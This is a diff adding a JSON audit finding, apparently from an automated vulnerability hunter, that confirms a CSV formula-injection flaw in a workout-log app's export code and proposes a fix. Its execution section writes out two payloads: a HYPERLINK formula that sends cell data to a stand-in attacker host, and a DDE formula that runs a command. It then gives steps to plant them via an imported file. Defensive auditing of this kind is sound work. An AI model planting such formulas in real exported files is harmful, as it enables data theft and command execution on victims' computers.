@@ -1,0 +1,124 @@
+{
+ "verdict": "confirmed",
+ "fingerprint": "export.buildCsv.csv-formula-injection-unneutralised-cells",
+ "title": "CSV export does not neutralise spreadsheet formula prefixes in imported notes and exercise names",
+ "description": "buildCsv writes free-text fields (log note, custom exercise name) through csvCell, which only quotes values containing comma, double quote, CR or LF. A value starting with =, +, - or @ is emitted as a live formula cell. Those fields are only length-capped when imported from a JSON data file, Excel workbook or CSV export, so a hostile file supplied to the user can plant formula text that runs when the user later exports a CSV and opens it in Excel, LibreOffice or Sheets. The XLSX builders are not affected because SheetJS writes strings as t:'s' cells. Impact is limited and needs user interaction: the user must import an untrusted file, export CSV, open it in a spreadsheet and accept any prompts.",
+ "root_cause": "csvCell escapes only CSV structural characters. It has no OWASP-style formula neutralisation (a leading apostrophe or tab before cells starting with = + - @ or CR/TAB). Import normalisation (text() in validate.ts) only truncates length, so formula-leading strings survive into the store and the export.",
+ "intended_behavior": "Exported CSV cells containing user or imported text should be neutralised so a spreadsheet treats them as text, never as a formula, regardless of what the data file contained.",
+ "trace": [
+  {
+   "kind": "entrypoint",
+   "file": "src/lib/export.ts",
+   "line": 191,
+   "scope": "normalizeData (data file / workbook import)",
+   "description": "Untrusted imported file contents (logs, custom exercise config) are passed to normalisation; this is the lower-trust input from whoever supplied the file."
+  },
+  {
+   "kind": "propagation",
+   "file": "src/shared/validate.ts",
+   "line": 84,
+   "scope": "normEntry",
+   "description": "Note e.n is kept via text(e.n, LIMITS.text.note), which only slices to a max length (text() at line 64). A leading =, +, - or @ is preserved."
+  },
+  {
+   "kind": "propagation",
+   "file": "src/store/useAppStore.ts",
+   "line": 794,
+   "scope": "exportCsv",
+   "description": "User-triggered CSV export passes the snapshot (including imported logs and cfg) to buildCsv."
+  },
+  {
+   "kind": "propagation",
+   "file": "src/lib/export.ts",
+   "line": 33,
+   "scope": "buildCsv row construction",
+   "description": "Row includes exInfo(cfg,id).n (exercise name) and noteOf(e) (note) as raw strings."
+  },
+  {
+   "kind": "sink",
+   "file": "src/lib/export.ts",
+   "line": 28,
+   "scope": "csvCell",
+   "description": "Only quotes for , \" CR LF; does not prefix cells beginning with = + - @, so formula text reaches the CSV unneutralised."
+  }
+ ],
+ "evidence": [
+  {
+   "file": "src/lib/export.ts",
+   "line": 28,
+   "description": "csvCell regex /[\",\\n\\r]/ is the only transformation; no formula-prefix handling."
+  },
+  {
+   "file": "src/lib/export.ts",
+   "line": 33,
+   "description": "Exercise name and note are emitted directly as CSV cells."
+  },
+  {
+   "file": "src/shared/validate.ts",
+   "line": 84,
+   "description": "Note is only length-capped on import; text() at line 64 does not strip or escape leading formula characters."
+  },
+  {
+   "file": "src/store/useAppStore.ts",
+   "line": 794,
+   "description": "exportCsv downloads buildCsv(get().snapshot()) with the imported data included."
+  },
+  {
+   "file": "src/lib/export.ts",
+   "line": 197,
+   "description": "Imported logs pass through normEntries, which retains note text containing formula prefixes."
+  }
+ ],
+ "conditions": [
+  {
+   "kind": "user_interaction",
+   "description": "Victim imports an attacker-supplied data file, workbook or CSV, then exports CSV and opens it in a spreadsheet application."
+  },
+  {
+   "kind": "user_interaction",
+   "description": "Spreadsheet may show a warning (e.g. DDE or external-content prompt) that the victim must accept for some payloads; HYPERLINK-style formulas need a click."
+  },
+  {
+   "kind": "environmental_dependency",
+   "description": "Spreadsheet application evaluates leading = + - @ cells from a .csv file (default behaviour in Excel and LibreOffice)."
+  }
+ ],
+ "execution": {
+  "attacker_perspective": "Someone who can get a crafted Iron Log JSON data file or xlsx workbook to the victim (for example a shared training log or backup) and have the victim import it.",
+  "payloads": [
+   "note: =HYPERLINK(\"http://attacker.example/?\"&A2,\"Squat\")",
+   "note: =cmd|' /C calc'!A0"
+  ],
+  "instructions": [
+   "Craft a data file whose log entry has n set to a string starting with '='.",
+   "Victim imports the file (normEntry keeps n, length-capped only).",
+   "Victim triggers Export CSV; buildCsv emits the note unquoted/unprefixed in the note column.",
+   "Victim opens the CSV in a spreadsheet; the cell is interpreted as a formula."
+  ],
+  "observed_result": "Source-level demonstration, consistent with the hunter's sandbox artifact (agents/hunt-client3-w3/artifacts/out/check-2.txt): csvCell passes a note beginning with = through unchanged, e.g. CSV row ...,=cmd|' /C calc'!A0,, and the exercise name =HYPERLINK(...) is only quoted because of its embedded quotes and commas, not neutralised. The xlsx cells came out as t:'s' strings, so only the CSV path is affected. I did not re-execute it; the code path is short and fully visible in source."
+ },
+ "remediation": {
+  "strategy": "In csvCell, prefix any string cell whose first character is =, +, -, @, tab or CR with a single quote (and still apply CSV quoting). Apply it only to text fields (exercise name, note, set_detail, muscle names), so numeric columns such as negative weights stay numeric. Optionally strip or reject leading formula characters in normEntry for note and in exercise-name normalisation.",
+  "code_changes": [
+   {
+    "file_name": "src/lib/export.ts",
+    "fixed_code": "function csvCell(v: unknown) { let t = v == null ? '' : String(v); if (typeof v === 'string' && /^[=+\\-@\\t\\r]/.test(t)) t = \"'\" + t; return /[\",\\n\\r]/.test(t) ? '\"' + t.replace(/\"/g, '\"\"') + '\"' : t; }"
+   }
+  ]
+ },
+ "severity": {
+  "likelihood": {
+   "score": "low",
+   "reason": "Requires the victim to import an untrusted file, export a CSV, open it in a spreadsheet and often accept a warning or click. The app has no sharing between users, so the only source is a file the user chooses to import."
+  },
+  "impact": {
+   "score": "low",
+   "reason": "Formula runs in the victim's spreadsheet only. Most payloads need acknowledgement, and the data in the CSV is the user's own training log. No server or other user data is reachable from the app."
+  },
+  "overall_severity": "low"
+ },
+ "confidence": {
+  "score": "medium",
+  "reason": "The source path is unambiguous and matches the hunter's artifact. Real-world exploitability depends on spreadsheet application behaviour and user prompts, which cannot be observed from the repository."
+ }
+}
